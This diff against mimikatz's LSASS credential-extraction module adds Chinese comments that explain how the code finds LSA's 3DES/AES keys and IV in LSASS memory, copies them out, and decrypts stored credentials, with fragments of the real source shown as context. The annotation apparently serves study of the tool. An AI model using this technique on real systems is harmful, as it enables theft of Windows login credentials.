@@ -121,7 +121,7 @@ VOID WINAPI kuhl_m_sekurlsa_nt6_LsaUnprotectMemory(IN PVOID Buffer, IN ULONG Buf
 {
 	kuhl_m_sekurlsa_nt6_LsaEncryptMemory((PUCHAR) Buffer, BufferSize, FALSE);
 }
-
+//用前面提取的 k3Des / kAes 密钥和全局 IV，来解密 LSASS 中加密的凭据数据
 NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
@@ -147,7 +147,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BO
 	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
 	return status;
 }
-
+//在 LSASS 内存里找到 LSA 用来保护凭据的加密密钥 (3DES/AES) 和初始化向量 (IV)
 NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
 {
 	NTSTATUS status = STATUS_NOT_FOUND;
@@ -204,7 +204,7 @@ NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_
 	}
 	return status;
 }
-
+//在 LSASS 中找到并提取 BCRYPT 对称密钥 (3DES/AES)
 BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
 {
 	BOOL status = FALSE;
@@ -260,7 +260,7 @@ BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M
 							if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, pHardKey->cbSecret))
 							{
 								__try
-								{
+								{	//用 Windows CNG API BCryptGenerateSymmetricKey，基于刚提取的原始密钥，生成 mimikatz 可以用的对称加密句柄
 									status = NT_SUCCESS(BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR) aLocalMemory.address, pHardKey->cbSecret, 0));
 								}
 								__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
